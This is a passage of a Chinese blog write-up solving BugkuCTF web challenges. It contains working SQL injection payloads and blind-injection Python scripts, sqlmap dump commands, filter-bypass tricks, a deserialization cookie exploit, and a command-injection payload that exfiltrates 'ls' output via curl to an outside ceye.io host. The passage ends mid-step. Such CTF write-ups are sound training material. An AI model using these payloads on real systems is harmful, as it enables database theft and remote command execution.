class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#依次使用下面四个payload即可得到flag</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆库名(可以省略，直接用下面三个就可以)</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;+(case when (substr(database() from &#123;i&#125; for 1)=&#x27;&#123;j&#125;&#x27;) then sleep(4) else 1 end))#&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#爆表名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;+(case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;i&#125; for 1)=&#x27;&#123;j&#125;&#x27;) then sleep(4) else 1 end))#&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆列名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;+(case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;) from &#123;i&#125; for 1)=&#x27;&#123;j&#125;&#x27;) then sleep(4) else 1 end))#&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#爆字段</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;+(case when (substr((select binary group_concat(flag) from flag) from <span class="subst">&#123;i&#125;</span> for 1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;) then sleep(4) else 1 end))#&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;x-forwarded-for&#x27;</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span>   </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190331234800422.png" alt="在这里插入图片描述"><br>因此最后得到flag为：<code>flag&#123;cdbf14c9551d5be5612f7bb5d2867853&#125;</code></p>
<br>

<h4 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="*这是一个神奇的登陆框"></a>*这是一个神奇的登陆框</h4><p>这题同样是一道注入题，因为是post注入，所以<strong>先抓包</strong>，这一题既可以手工注入，也可以直接用sqlmap跑。</p>
<h6 id="1-手工注入"><a href="#1-手工注入" class="headerlink" title="1.手工注入"></a>1.手工注入</h6><p>（1）测试发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin_name=1&quot;&amp;admin_passwd=password&amp;submit=GO+GO+GO       报错</span><br><span class="line">admin_name=1&quot;#&amp;admin_passwd=password&amp;submit=GO+GO+GO      Try Again!</span><br></pre></td></tr></table></figure>
<p><code>1&quot;</code>报错了，而<code>1&quot;#</code>则为<code>Try Again!</code>，判断应该用双引号闭合的。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/201904010036068.png" alt="在这里插入图片描述"><br>（2）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin_name=1&quot; order by 3 #&amp;admin_passwd=password&amp;submit=GO+GO+GO</span><br><span class="line">到3的时候报错，判断应该有两列</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401003933823.png" alt="在这里插入图片描述"><br>（3）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&quot; union select 1,2#</span><br><span class="line">判断应该用1的位置进行注入</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401004238988.png" alt="在这里插入图片描述"><br>（3）暴库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot; union select database(),2#</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401004518874.png" alt="在这里插入图片描述"><br>（4）爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2#</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401004837781.png" alt="在这里插入图片描述"><br>（5）爆列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag1&#x27;),2#</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401005032740.png" alt="在这里插入图片描述"><br>（5）爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot; union select (select group_concat(flag1) from flag1),2#</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401005132686.jpg" alt="在这里插入图片描述"></p>
<h6 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h6><p>首先将抓包下来的包保存为txt文件（我是直接放在了sqlmap的目录下，下面文件位置应该使用绝对路径），依次执行下列命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;2.txt&quot; -p admin_name --dbs</span><br><span class="line">sqlmap.py -r &quot;2.txt&quot; -p admin_name -D bugkusql1 --tables</span><br><span class="line">sqlmap.py -r &quot;2.txt&quot; -p admin_name -D bugkusql1 -T flag1 --columns</span><br><span class="line">sqlmap.py -r &quot;2.txt&quot; -p admin_name -D bugkusql1 -T flag1 -C flag1 --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401005606230.png" alt="在这里插入图片描述"><br></p>
<h4 id="多次"><a href="#多次" class="headerlink" title="*多次"></a>*多次</h4><p>这一题比较坑，一开始测试了几个数据，发现只有<code>There is nothing.</code>和<code>Error,Error,Error!</code>两种回显，还以为是盲注，但其实不是盲注….<br>（1）第一关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1			回显There is nothing.</span><br><span class="line">?id=1&#x27;			回显Error,Error,Error!</span><br><span class="line">?id=1&#x27;--+		回显There is nothing.</span><br><span class="line"></span><br><span class="line">但是：</span><br><span class="line">?id=1&#x27; and 1=1--+ 回显了Error,Error,Error!，所以应该还过滤了什么</span><br><span class="line">尝试</span><br><span class="line">?id=1&#x27; anandd 1=1--+ 回显了There is nothing.</span><br><span class="line">所以这里应该是用空值替换了SQL某些关键字，可以双写绕过</span><br></pre></td></tr></table></figure>
<p>这里可以用<strong>异或注入</strong>来判断过滤了哪些关键词：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">异或：1^1=0，1^0=1，0^1=1，0^0=0</span><br><span class="line">这样当构造：?id=1&#x27;^(length(&#x27;and&#x27;)=0)--+</span><br><span class="line">若返回正确页面的回显(There is nothing.)，则说明(length(&#x27;and&#x27;)=0)为假;</span><br><span class="line">若返回错误页面的回显(Error,Error,Error!)，则说明(length(&#x27;and&#x27;)=0)为真。</span><br><span class="line"></span><br><span class="line">这里?id=1&#x27;^(length(&#x27;and&#x27;)=0)--+均回显了Error,Error,Error!，说明(length(&#x27;and&#x27;)=0)为真，那么可判断and被过滤了</span><br><span class="line">同理可判断or、select、union也被过滤了</span><br></pre></td></tr></table></figure>
<p>下面进行手工注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">爆表名</span><br><span class="line">?id=-1&#x27; uniunionon seleselectct 1,(seleselectct group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())--+</span><br><span class="line">爆列名</span><br><span class="line">?id=-1&#x27; uniunionon seleselectct 1,(seleselectct group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag1&#x27;)--+</span><br><span class="line">爆address字段的值</span><br><span class="line">?id=-1&#x27; uniunionon seleselectct 1,(seleselectct group_concat(address) from flag1)--+</span><br></pre></td></tr></table></figure>
<p>这样就可以进入下一关。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190401215847432.png" alt="在这里插入图片描述"></p>
<p>（2）第二关<br>发现会回显<code>Hello,I Am Here!</code>和<code>Nobody!</code>，经过异或测试，发现过滤了<code>union</code>和<code>substr</code>，可以用<code>mid()</code>来代替<code>substr()</code>，写的盲注脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:9004/Once_More.php&#x27;</span></span><br><span class="line">payloads = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,&#123;&#125;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤了union和substr</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:  <span class="comment"># 依次跑下面三个payload</span></span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and mid((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;--+&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and mid((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;flag2&#x27;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 字段</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and mid((select binary group_concat(flag2) from flag2),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 这里通过加入binary来区分大小写，因为flag中大小写都可能包含</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nobody&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)    </span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190406005018309.png" alt="在这里插入图片描述"><br>这里除了盲注，其实还会在页面上显示错误信息，因此也可以利用用<strong>updatexml() 函数报错注入</strong>。</p>
<blockquote>
<p><strong>updatexml()函数</strong><br><br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br> 第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据  <br><br> <strong>作用</strong>： 改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
</blockquote>
<p>例如，<code>updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);</code><br>由于<code>updatexml()</code>的第二个参数需要Xpath格式的字符串，以<code>~</code>开头的内容不是xml格式的语法，其中的<code>concat()</code>函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 表名</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;~&#x27;),3) %23</span><br><span class="line"></span><br><span class="line"># 字段名</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag2&#x27;),&#x27;~&#x27;),3) %23  </span><br><span class="line"></span><br><span class="line"># 字段值</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select flag2 from flag2),&#x27;~&#x27;),3) %23</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190406011345493.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="*PHP_encrypt_1(ISCCCTF)"></a>*PHP_encrypt_1(ISCCCTF)</h4><p>解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import hashlib</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;用python重写后的加密方法</span></span><br><span class="line"><span class="string">def eccrypt(data):</span></span><br><span class="line"><span class="string">    key = hashlib.md5(&#x27;ISCC&#x27;).hexdigest()</span></span><br><span class="line"><span class="string">    # print &#x27;key--&gt;&#x27;, key</span></span><br><span class="line"><span class="string">    x = 0</span></span><br><span class="line"><span class="string">    char = &#x27;&#x27;</span></span><br><span class="line"><span class="string">    data_len = len(data)  # data的长度</span></span><br><span class="line"><span class="string">    key_len = len(key)  # key的长度</span></span><br><span class="line"><span class="string">    for i in range(data_len):</span></span><br><span class="line"><span class="string">        if x == key_len:</span></span><br><span class="line"><span class="string">            x = 0</span></span><br><span class="line"><span class="string">        char += key[x]</span></span><br><span class="line"><span class="string">        x += 1</span></span><br><span class="line"><span class="string">    # print &#x27;char--&gt;&#x27;, char</span></span><br><span class="line"><span class="string">    flag = &#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(data_len):</span></span><br><span class="line"><span class="string">        flag += chr((ord(data[i]))+(ord(char[i])) % 128)</span></span><br><span class="line"><span class="string">    # print &#x27;flag--&gt;&#x27;, flag</span></span><br><span class="line"><span class="string">    return base64.b64encode(flag)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detrcy</span>(<span class="params">b64</span>):</span><br><span class="line">    int_b64 = []</span><br><span class="line">    b64de = base64.b64decode(b64)</span><br><span class="line">    <span class="comment"># print &#x27;b64de--&gt;&#x27;, b64de</span></span><br><span class="line">    <span class="comment"># print &#x27;len_b64de--&gt;&#x27;, len(b64de)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b64de)):</span><br><span class="line">        int_b64.append(<span class="built_in">ord</span>(b64de[i]))</span><br><span class="line">    <span class="comment"># print &#x27;int_b64--&gt;&#x27;,int_b64</span></span><br><span class="line">    <span class="comment"># print &#x27;len_int_b64--&gt;&#x27;, len(int_b64)</span></span><br><span class="line">    key = <span class="string">&#x27;729623334f0aa2784a1599fd374c120d729623&#x27;</span>  <span class="comment"># 知道data的长度后直接写出来</span></span><br><span class="line">    int_key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        int_key.append(<span class="built_in">ord</span>(key[i]))</span><br><span class="line">    <span class="comment"># print &#x27;int_key--&gt;&#x27;, int_key</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_b64)):</span><br><span class="line">        flag += <span class="built_in">chr</span>((int_b64[i]-int_key[i]+<span class="number">128</span>) % <span class="number">128</span>)</span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># str_b64 = eccrypt(&#x27;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#x27;)</span></span><br><span class="line">    <span class="comment"># print &#x27;str_b64--&gt;&#x27;, str_b64</span></span><br><span class="line">    str_b64 = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span></span><br><span class="line">    <span class="comment"># print &#x27;str_b64--&gt;&#x27;, str_b64</span></span><br><span class="line">    detrcy(str_b64)</span><br></pre></td></tr></table></figure>

<br>

<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><p>（1）根据提示，访问<code>?hint=flag.php</code>页面，页面上显示了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt; </span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt; </span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt; </span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt; </span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt; </span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt; </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">&#125; </span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;; </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>（2）代码审计，是一道反序列化的题，构造<code>Cookie：ISecer</code>的值等于<code>$key</code>的值，一开始看到最下面的代码，以为<code>$key=ISecer:www.isecer.com</code>，多次尝试无果。再仔细看，发现这个赋值语句是在上面的判断语句之后才执行的，所以判断的时候<code>$key</code>的值为空…<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190411124128475.png" alt="在这里插入图片描述"><br>执行上面代码，得到：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190411124238626.png" alt="在这里插入图片描述"><br>（3）传入构造的Cookie：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190411124454468.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h4><p>名字虽然叫sql注入，但这其实是<code>.DS_Store</code>泄露，利用工具ds_store_exp:<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190411124801885.png" alt="在这里插入图片描述"><br>打开flag页面，下载到文件flag:<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/2019041112491636.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h4><p>扫目录，发现<code>show.php</code>，访问得到<code>flag</code>….<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190411125102545.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h1><p>打开题目是一个登陆界面，但是没找到注册界面，应该是利用注入来登录，尝试了几个常见的payload无果，查看HTTP头部，发现tip:<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118100031233.png" alt="在这里插入图片描述"><br>Base64解码得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们可以构造payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin&#x27; union select 1,md5(1)#</span><br><span class="line">password = 1</span><br></pre></td></tr></table></figure>

<p>登录成功后进入一个进程监控系统：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118100339641.png" alt="在这里插入图片描述"></p>
<p>随意测试可以看出来应该是一个命令执行的地方，但是不会将你额外执行的命令进行回显，先用如下payload测试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;sleep 3</span><br></pre></td></tr></table></figure>

<p>发现会延时3秒，于是我们想办法进行无回显的RCE</p>
<p>可以利用请求外带的方式得到命令执行的结果，构造如下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;curl 288vqv.ceye.io/`ls|base64`</span><br></pre></td></tr></table></figure>

<p>可以收到<code>ls</code>命令base64后的结果：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118100925596.png" alt="在这里插入图片描述"><br>解码得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">css</span><br><span class="line">fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt</span><br><span class="line">index.php</span><br><span class="line">login.php</span><br></pre></td></tr></table></figure>

<p>再构造：</p>
